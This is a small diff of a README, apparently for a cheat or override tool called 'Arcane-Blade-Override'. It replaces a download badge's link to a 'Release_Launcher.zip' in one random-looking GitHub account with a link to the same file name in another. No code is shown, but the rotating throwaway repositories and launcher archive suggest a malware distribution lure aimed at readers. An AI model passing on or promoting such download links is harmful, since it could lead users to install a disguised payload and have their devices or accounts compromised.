@@ -1,5 +1,5 @@
 ![preview](https://raw.githubusercontent.com/Doanquancc12/Arcane-Blade-Override/main/screen_125245.svg)
-[![Download](https://raw.githubusercontent.com/Doanquancc12/Arcane-Blade-Override/main/bin_0b9d.svg)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
+[![Download](https://raw.githubusercontent.com/Doanquancc12/Arcane-Blade-Override/main/bin_0b9d.svg)](https://github.com/SenseiWalker67/dagnmwes/releases/download/v1/Release_Launcher.zip)
 
 ---
 ## Not Working?
